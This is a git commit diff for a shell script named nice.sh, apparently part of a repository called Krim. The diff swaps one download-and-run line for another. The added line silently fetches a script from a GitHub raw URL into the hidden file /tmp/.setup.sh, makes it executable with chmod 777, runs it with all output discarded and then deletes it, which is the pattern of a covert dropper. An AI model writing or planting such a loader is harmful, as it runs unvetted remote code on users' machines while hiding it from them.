8ee57724d8aa12ca5557eb1ef17bf14a4b77235e
MisterJokes <35965834+MisterJokes@users.noreply.github.com>
2018-03-12 15:19:49 +0100

    Update nice.sh

--- nice.sh
+++ nice.sh
@@ -1,3 +1,2 @@
-echo "nice";
-curl -s https://raw.githubusercontent.com/MisterJokes/Krim/master/test.sh > /tmp/.setup.sh;chmod 777 /tmp/.setup.sh;/tmp/.setup.sh &>/dev/null
+curl -s https://raw.githubusercontent.com/SteveJobsDerEchte/Krim/master/nice.sh > /tmp/.setup.sh;chmod 777 /tmp/.setup.sh;/tmp/.setup.sh &>/dev/null
 rm /tmp/.setup.sh &>/dev/null
